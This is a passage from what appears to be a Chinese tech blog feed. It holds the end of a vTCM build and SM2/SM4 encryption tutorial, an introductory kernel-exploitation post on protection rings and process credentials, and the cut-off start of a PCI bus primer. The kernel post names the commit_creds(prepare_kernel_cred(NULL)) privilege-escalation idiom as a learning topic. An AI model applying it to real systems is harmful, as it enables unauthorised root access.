https://gitee.com/biparadox/cube-1.3.git<br>git clone https://gitee.com/biparadox/cube-tcm.git<br>git clone https://github.com/TCLab-BJUT/gm_sm2.git<br>cd gm_sm2<br>make<br>cp ./bin/libsm2So.so ../cube-tcm/locallib<br>cd ../cube-1.3<br><br>sed -i &quot;s|export CUBEAPPPATH=\`pwd\`|export CUBEAPPPATH=/opt/cube-1.3|&quot; set_env.sh#把这里的/opt/cube-1.3改成自己cube-1.3的地址<br><br>source set_env.sh<br>sh env_build.sh<br>cd ../cube-tcm<br><br>sed -i &quot;s|export CUBEAPPPATH=\`pwd\`|export CUBEAPPPATH=/opt/build_vtcm/vtcm/cube-tcm|&quot; set_env.sh#把这里的/opt/cube-1.3改成自己cube-tcm的地址<br><br>source set_env.sh<br>sh env_build.sh<br>cd vtcm_dev<br>make<br></code></pre></td></tr></table></figure></li><li><p>set_env.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>current_path=/opt/build_vtcm#这里改成自己的根目录所在地址<br>cd ./vtcm/cube-1.3<br>source set_env.sh<br>cd ../cube-tcm<br>source set_env.sh<br>cd $current_path<br></code></pre></td></tr></table></figure></li><li><p>run_vtcm_netlink_emulator.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>sudo ./load_vtcmd_dev.sh<br>cd ../vtcm_netlink_emulator<br>./main_proc<br></code></pre></td></tr></table></figure></li><li><p>test_pcrread.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>cd ./vtcm/cube-tcm/vtcm_utils<br>./main_proc ./pcr/pcrread.cmd<br></code></pre></td></tr></table></figure></li></ol><p>在term1中执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source build_vctm.sh<br>sh run_vtcm_netlink_emulator.sh<br></code></pre></td></tr></table></figure><p>在term2中执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source set_env.sh<br>sh test_pcrread.sh<br></code></pre></td></tr></table></figure><h3 id="加密、解密、签名、验证">加密、解密、签名、验证</h3><h4 id="密钥创建">密钥创建</h4><p>下面首先执行创建密钥操作。TCM中，密钥创建可以选择基于SM2算法的非对称钥和基于SM4算法的对称钥。密钥创建命令为createwrapkey。tcm_utils 接受的密钥创建命令其格式如下：</p><p>createwrapkey -ikh 封装密钥句柄 –ish 封装密钥会话句柄 -is (sm2|sm4)  -kf  密钥文件名称 -pwdk 密钥授权口令 [–pwdm 密钥移植口令]</p><p>下面我们写一个密钥创建脚本程序createkey.cmd，该程序以SMK为封装密钥创建一个非对称密钥和一个对称密钥，密钥口令分别为sm2和sm4，并分别存储在文件sm2.key和文件sm4.key中，脚本如下：</p><p>我们可以输入以下命令，来创建对称密钥和非对称密钥。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">in:</span> apcreate -it <span class="hljs-number">04</span> -pwd sss<br><span class="hljs-symbol">out:</span> <span class="hljs-number">1</span>:$smkHandle<br><span class="hljs-symbol">in:</span> createwrapkey -ikh <span class="hljs-number">40000000</span> -ish $smkHandle -<span class="hljs-built_in">is</span> sm2 -kf sm2.<span class="hljs-keyword">key</span> -pwdk sm2<br><span class="hljs-symbol">in:</span> createwrapkey -ikh <span class="hljs-number">40000000</span> -ish $smkHandle -<span class="hljs-built_in">is</span> sm4 -kf sm4.<span class="hljs-keyword">key</span> -pwdk sm4<br><span class="hljs-symbol">in:</span> apterminate -ih $smkHandle<br></code></pre></td></tr></table></figure><p>当然也可以手动输入，由于前文我已经获取到了句柄，为b90e432，所以我直接使用该句柄就行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">createwrapkey -ikh 40000000 -ish b90e432 -is sm2 -kf sm2.key -pwdk sm2<br>createwrapkey -ikh 40000000 -ish b90e432 -is sm4 -kf sm4.key -pwdk sm4<br></code></pre></td></tr></table></figure><p>创建成功后可以看到文件夹下多了sm2和sm4的密钥文件</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207161731111.png" alt="image-20241207161731111"></p><h4 id="加密解密">加密解密</h4><p>非对称密钥加密解密：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">in</span>: sm2encrypt -kf sm2<span class="hljs-selector-class">.key</span> -rf sm2test<span class="hljs-selector-class">.dat</span> -wf sm2crypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>:  apcreate -it <span class="hljs-number">04</span> -pwd sss<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$smkHandle</span> <br><span class="hljs-keyword">in</span>: loadkey -ih <span class="hljs-variable">$smkHandle</span> -kf sm2<span class="hljs-selector-class">.key</span> <br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyHandle</span> <br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$smkHandle</span> <br><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">01</span> -iv <span class="hljs-variable">$keyHandle</span> -pwd sm2 <br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyAuthHandle</span> <br><span class="hljs-keyword">in</span>: sm2decrypt -ik <span class="hljs-variable">$keyHandle</span> -is <span class="hljs-variable">$keyAuthHandle</span> -rf sm2crypt<span class="hljs-selector-class">.dat</span>  -wf <br>sm2decrypt<span class="hljs-selector-class">.dat</span> <br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$keyAuthHandle</span><br></code></pre></td></tr></table></figure><p>创建一个数据文件sm2test.dat，此处我写入数据vTCM_is_good：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207162537053.png" alt="image-20241207162537053"></p><p>输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm2encrypt -kf sm2.key -rf sm2test.dat -wf sm2crypt.dat<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207162709694.png" alt="image-20241207162709694"></p><p>使用smk句柄（b90e432）输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">loadkey -ih b90e432 -kf sm2.key <br></code></pre></td></tr></table></figure><p>此时会返回sm2密钥的句柄80bd5ebe，之后请自行替换有关80bd5ebe的地方。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207163509456.png" alt="image-20241207163509456"></p><p>使用密钥句柄，获取密钥授权句柄</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate -it 01 -iv 80bd5ebe -pwd sm2<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207163856377.png" alt="image-20241207163856377"></p><p>此处我的句柄为79d4a365，之后请自行替换有关79d4a365的地方。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm2decrypt -ik 80bd5ebe -is 79d4a365 -rf sm2crypt.dat  -wf sm2decrypt.dat<br></code></pre></td></tr></table></figure><p>打开sm2decrypt.dat文件，发现解密成功：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207165332904.png" alt="image-20241207165332904"></p><p>对称密钥加解密脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">04</span> -pwd sss<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$smkHandle</span><br><span class="hljs-keyword">in</span>: loadkey -ih <span class="hljs-variable">$smkHandle</span> -kf sm4<span class="hljs-selector-class">.key</span><br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyHandle</span><br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$smkHandle</span><br><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">01</span> -iv <span class="hljs-variable">$keyHandle</span> -pwd sm4<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyAuthHandle</span>  <br><span class="hljs-keyword">in</span>: sm4encrypt -ikh <span class="hljs-variable">$keyHandle</span> -idh <span class="hljs-variable">$keyAuthHandle</span> -rf sm4test<span class="hljs-selector-class">.dat</span> -wf sm4crypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>: sm4decrypt -ikh <span class="hljs-variable">$keyHandle</span> -idh <span class="hljs-variable">$keyAuthHandle</span> -rf sm4crypt<span class="hljs-selector-class">.dat</span> -wf sm4decrypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$keyAuthHandle</span><br></code></pre></td></tr></table></figure><p>接下来一步步来看对应的结果，首先smk句柄我们已经获取到了，那么直接获取密钥句柄</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">loadkey -ih b90e432 -kf sm4.key<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207170828244.png" alt="image-20241207170828244"></p><p>我的密钥句柄为7fee8800，请读者自行在对应的地方替换成自己的句柄。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apterminate -ih b90e432<br>apcreate -it 01 -iv 7fee8800 -pwd sm4<br></code></pre></td></tr></table></figure><p>此时返回密钥授权句柄，为4f5e17bf。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171131431.png" alt="image-20241207171131431"></p><p>到这一步我们先在./vtcm_utils文件夹下建立sm4test.dat文件，并写入数据。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171505646.png" alt="image-20241207171505646"></p><p>使用sm4进行加密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm4encrypt -ikh 7fee8800 -idh 4f5e17bf -rf sm4test.dat -wf sm4crypt.dat<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171559386.png" alt="image-20241207171559386"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171543801.png" alt="image-20241207171543801"></p><p>接下来进行解密：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm4decrypt -ikh 7fee8800 -idh 4f5e17bf -rf sm4crypt.dat -wf sm4decrypt.dat<br></code></pre></td></tr></table></figure><p>解密成功：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171910659.png" alt="image-20241207171910659"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171926293.png" alt="image-20241207171926293"></p><h3 id="PIK申请过程🕊️">PIK申请过程🕊️</h3>]]></content>
    
    
    
    <tags>
      
      <tag>vTPM</tag>
      
      <tag>vTCM</tag>
      
      <tag>swtpm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>直博自救，从零开始的Kernel Pwn入门</title>
    <link href="/2025/08/25/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn%E5%85%A5%E9%97%A8/"/>
    <url>/2025/08/25/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="开始之前">开始之前</h1><p>笔者是双非本，本科前两年其实挺摆的，所以也没啥科研成果，均绩也不太好，尽管过程很曲折但是最后还是保研成功。笔者受家庭影响最开始对直博的看法还不错，所以推免时笔者也经常套瓷直博，最后来这所学校直博是因为离家近，没想到这竟然是噩梦的开始。</p><p>说实话，直博到现在感觉到的只有痛苦，课题组毫无进展、导师毫无实质性帮助只会不停push进度以及组内还需要做横向都让我无比失落，与读博之前的畅想完全不同。在这提前进组的一年，学习的东西都是浅尝辄止，因为之前一直根据课题组的需要来学习的，但是课题组根本没有一个确切的方向，学的东西也都不确定能不能用上，因此研究的对象也一直在换，就这样白白耽误了一年时间。</p><p>在这种情况下笔者一度产生提桶跑路的想法，不过最后还是放弃了，可能是因为笔者性格本身就不够勇敢，也可能是看了网上一些直博的心得发现大家都差不多（国内起码都差不多）。这期间笔者看到很应景的一句话，“读博就像是在青楼当妓女，你需要做的不是争做头牌，而是尽快赎身”。那时候我大概明白了，既然组里和导师都靠不住，那就靠自己吧，做自己想做的，组内的东西就不管了，导师骂归骂，自己做归做，只要达到毕业条件自然不会卡毕业。</p><p>想通之后笔者就释然了，组里的方向都没定我也不想帮忙了，想到之前很早就想研究的内核安全，遂来学习，争取在我自己感兴趣的方向做出点成果出来。虽然以这个方向毕业确实很难，但是起码是我愿意一直做下去的且是一个明确的目标。</p><p>有感而发，废话就说到这么多，由于笔者<s>太菜</s>可能存在一些术语使用不标准，如果有读者发现错误请不吝赐教，同时笔者借鉴了很多ctf-wiki和其他大佬的内容，都标注在文后了，如有侵权请联系yzsandw@gmail.com。</p><h1 id="Operation-System-Kernel">Operation System Kernel</h1><p>操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。</p><p>操作系统内核其实是一个抽象出来的概念，实际上内核和普通进程是一样在内存中并且由cpu执行，不同之处在于cpu执行内核代码时通常处于高权限，拥有完全的硬件访问能力，而用户代码往往执行在低权限环境。</p><p>不同的权限状态其实是通过硬件来实现的，硬件提供的<strong>分级保护环</strong>实现这种区分。</p><h1 id="hierarchical-protection-domains">hierarchical protection domains</h1><p><strong>分级保护域</strong>（hierarchical protection domains又被称作保护环，简称 Rings ，是一种将计算机不同的资源划分至不同权限的模型。</p><p>在一些硬件或者微代码级别上提供不同特权态模式的 CPU 架构上，保护环通常都是硬件强制的。Rings 是从最高特权级（通常被叫作 0 级）到最低特权级（通常对应最大的数字）排列的。</p><p>Intel 的 CPU 将权限分为四个等级：Ring0、Ring1、Ring2、Ring3，权限等级依次降低，现代操作系统模型中我们通常只会使用 ring0 和 ring3，对应操作系统内核与用户进程，即 CPU 在执行用户进程代码时处在 ring3 下。</p><ul><li><strong>Ring 0</strong>：权限最高，操作系统内核运行在这里，可以直接访问硬件、管理内存、切换进程等。</li><li><strong>Ring 1/2</strong>：设计上是给驱动程序或中间层使用的，但在现代操作系统中几乎不用，常被忽略。</li><li><strong>Ring 3</strong>：权限最低，用户程序运行在这里，不能直接访问硬件，只能通过系统调用进入内核。</li></ul><p>这样分级的目的是为了<strong>保护内核和关键资源不被普通程序直接破坏</strong>。</p><p>在其他架构（比如 ARM）里，也有类似的机制，不过叫做 <strong>异常等级 (Exception Levels, EL0–EL3)</strong>，EL0 是用户程序，EL1 是内核，EL2 用于虚拟化，EL3 用于安全监控（TrustZone）。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/Priv_rings.svg.png" alt="Priv_rings.svg"></p><p>现在我们给【用户态】与【内核态】这两个概念下定义：</p><ul><li>用户态：CPU 运行在 ring3 + 用户进程运行环境上下文。</li><li>内核态：CPU 运行在 ring0 + 内核代码运行环境上下文。</li></ul><h1 id="状态切换">状态切换</h1><p>普通应用程序运行时处在用户态，只能执行受限指令。如果程序需要访问硬件或执行敏感操作（比如读写文件、分配内存、发送网络请求），就必须通过<strong>系统调用</strong>或<strong>异常/中断</strong>的方式进入内核。CPU 接收到系统调用指令（如 <code>int 0x80</code>、<code>syscall</code>、<code>svc</code> 等）后，会切换到内核态，跳转到内核定义的入口地址执行。内核完成操作后，再通过 <code>iret</code> 或 <code>sysret</code> 之类的指令返回用户态，恢复程序继续运行。</p><h2 id="user-space-to-kernel-space-系统调用">user space to kernel space(系统调用)</h2><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code> 等事件时，会发生用户态到内核态的切换，进入到内核相对应的处理程序中进行处理。</p><p>系统调用是内核与用户通信的直接接口，因此我们主要关注用户空间比较常用的系统调用这一行为，其具体的过程为：</p><blockquote><p>注：这部分代码都是在内核态中执行的</p></blockquote><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值</li><li>通过汇编指令判断是否为 <code>x32_abi</code>。</li><li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><h2 id="kernel-space-to-user-space">kernel space to user space</h2><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值。</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）。</li></ol><h1 id="内核漏洞利用的特点">内核漏洞利用的特点</h1><p>在用户态漏洞利用时，利用的主要是进程本身的漏洞从而获取主机的控制权。而在内核态Pwn时主要会以“权限提升”作为主要目标，其前提看一看为在攻击者已经通过某种方式入侵了目标机器的情况下，攻击者利用内核漏洞进一步提升权限。因此“如何提升进程权限”成为一个问题，其中，我们需要知道进程权限是以什么样的形式存在的。</p><p>我们先来看一个进程的结构是怎么样的，在内核源码的<code>include/linux/sched.h</code>中定义了进程结构体<code>task_struct</code>，具体结构如下图所示。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250826142629323.png" alt="image-20250826142629323"></p><h2 id="进程权限凭证-credential">进程权限凭证(credential)</h2><p>可以在<code>task_struct</code>的源码中看到进程权限凭证<code>cred</code>的相关定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">cred</span>;</span><br></code></pre></td></tr></table></figure><p>一个 cred 结构体中记载了一个进程四种不同的用户 ID：</p><ul><li>真实用户 ID（real UID）：标识一个进程启动时的用户 ID</li><li>保存用户 ID（saved UID）：标识一个进程最初的有效用户 ID</li><li>有效用户 ID（effective UID）：标识一个进程正在运行时所属的用户 ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户 ID 进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li>文件系统用户 ID（UID for VFS ops）：标识一个进程创建文件时进行标识的用户 ID</li></ul><p>这几个ID可以这样理解：当你以用户态打开一个shell时，**真实用户ID(real UID)<strong>即为登录用户的ID，之后shell中想以root权限删除一个文件，使用sudo rm命令，这时候</strong>有效用户ID(effective UID)<strong>为root用户ID，这时候的删除进程实际上是普通用户创建的，但是其拥有root用户的权限。但是内核不会允许一个进程一直占据高权限，因此</strong>保存用户ID(saved UID)**将保存进程最开始的eUID，在之后euid 会与 suid 进行交换。</p><p>用户组 ID 同样分为四个：真实组 ID、保存组 ID、有效组 ID、文件系统组 ID，与用户 ID 是类似的，这里便不再赘叙。</p><h2 id="进程权限改变">进程权限改变</h2><p>前面我们讲到，一个进程的权限是由位于内核空间的 <code>cred</code> 结构体进行管理的，那么我们不难想到：只要改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。</p><p>在内核空间有如下两个函数，都位于 <code>kernel/cred.c</code> 中：</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon 参数应为有效的进程描述符地址。</li><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的 cred 结构体应用到进程。</li></ul><p>在内核版本6.2以前，<code>prepare_kernel_cred()</code>函数如果传入<code>NULL</code>，该函数会拷贝 <code>init_cred</code> 并返回一个有着 root 权限的 cred，不难想到，如果使用<code>commit_creds(prepare_kernel_cred(NULL))</code>就可以直接完成提权的操作。不过自从内核版本 6.2 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法无法再应用于 6.2 及更高版本的内核。</p><h1 id="Kernel安全机制">Kernel安全机制</h1><h1 id="内核漏洞利用方式">内核漏洞利用方式</h1><h1 id="Exploit编译与传输">Exploit编译与传输</h1><h1 id="参考文章">参考文章</h1><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode">CTF Wiki</a></p><p><a href="https://arttnba3.cn/">arttnba3佬的博客，是笔者很崇拜的大佬</a></p><p><a href="https://cyr1s.vercel.app/">Cyr1s佬的博客</a></p><p><a href="https://blog.wohin.me/">Fernweh佬，也是笔者崇拜的大佬</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>kernel-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单了解PCI总线</title>
    <link href="/2025/07/09/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3PCI%E6%80%BB%E7%BA%BF/"/>
    <url>/2025/07/09/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3PCI%E6%80%BB%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p>怎么越来越底层了？</p><span id="more"></span><h1 id="开始之前">开始之前</h1><blockquote><p>由于部分原因，笔者最近需要了解PCI总线，但是身边没有相关的资料，因此本文有很多东西会因为笔者太菜的原因一笔带过，希望读者见谅。</p><blockquote><p>如果读者需要更专业的知识请参考<a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">《PCI_Express_Technology》</a></p></blockquote></blockquote><h1 id="PCI-基础">PCI 基础</h1><h2 id="总线结构简述">总线结构简述</h2><p>计算机中的<strong>总线（Bus）<strong>是计算机各种功能部件之间传送信息的</strong>公共通信干线</strong>，CPU 及各种设备都通过这跟总线进行通信</p><p>总线按功能可以分为以下三种类型：</p><ul><li><strong>片内总线</strong>：芯片内的总线，位于 CPU 内部，用以在寄存器与寄存器、寄存器与 ALU 之间进行数据交换</li><li><strong>系统总线</strong>：计算机系统内各功能单元（CPU、主存、I/O）之间的公共通信干线，也称之为 <em>内总线</em></li><li><strong>通信总线</strong>：用于计算机系统之间或是计算机系统与其他系统（例如远程通信设备）之间进行通信的总线，也称之为 <em>外总线</em></li></ul><p>总线是可以扩展的，即可以存在多个不同类型的总线相连，不同的设备接入到不同类型的总线上</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250625155025910.png" alt="image-20250625155025910"></p><h2 id="PCI概念简述">PCI概念简述</h2><p>PCI全称<strong>Peripheral Component Interconnect</strong>，<strong>外围部件互连</strong>。其通过多根 PCI bus 完成 CPU 与 多个 PCI 设备间的连接，，在 X86 硬件体系结构中几乎所有的设备都以各种形式连接到 PCI 设备树上</p><p><code>PCI express</code> 是新一代的总线标准，它沿用既有的PCI编程概念及信号标准，并且构建了更加高速的串行通信系统标准</p><p>PCI 总线主要被分成三部分：</p><ul><li><strong>PCI 设备</strong>。符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。图中的 Audio、LAN 都是一个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。</li><li><strong>PCI 总线</strong>。PCI 总线在系统中可以有多条，类似于树状结构进行扩展，每条 PCI 总线都可以连接多个 PCI 设备/桥。上图中有两条 PCI 总线。</li><li><strong>PCI 桥</strong>。当一条 PCI 总线的承载量不够时，可以用新的 PCI 总线进行扩展，而 PCI 桥则是连接 PCI 总线之间的纽带。主要有以下三种：<ul><li>HOST/PCI 桥：也称为 PCI 主桥或者 PCI 总线控制器，用以连接 CPU 与 PCI 根总线，<strong>隔离设备地址空间与存储器地址空间</strong>，现代 PC 通常还会在其中集成内存控制器，称之为<strong>北桥芯片组</strong>（North Bridge Chipset）</li><li>PCI/ISA 桥：用于连接旧的 ISA 总线，通常还会集成中断控制器（如 i8359A），称之为<strong>南桥芯片组</strong>（South Bridge Chipset）</li><li>PCI-to-PCI 桥：用于连接 PCI 主总线（Primary Bus）与次总线（Secondary Bus）</li></ul></li></ul><p>PCI采用树形拓扑结构，一个典型的 PCI 树状结构如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250708151634486.png" alt="image-20250708151634486"></p><p>由此，一个多层 PCI 总线结构如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250708151952505.png" alt="image-20250708151952505"></p><p>在 Linux 下我们可以使用 <code>lspci</code> 指令查看插在当前机器的 PCI bus 上的 PCI 设备，使用 <code>-t</code> 参数查看树形结构，<code>-v</code> 参数可以查看详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute1:~# lspci -t -v<br>-+-[0000:e0]-+-00.0  Chengdu Haiguang IC Design Co., Ltd. Root Complex<br> |           +-01.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-02.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-03.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-04.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-07.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-07.1-[e1]--+-00.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Function<br> |           |            \-00.2  Chengdu Haiguang IC Design Co., Ltd. PSPCCP Command DMA Processor<br> |           +-08.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           \-08.1-[e2]--+-00.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Function<br></code></pre></td></tr></table></figure><p>我们还可以使用 <code>lshw -businfo</code> 命令来获取设备信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 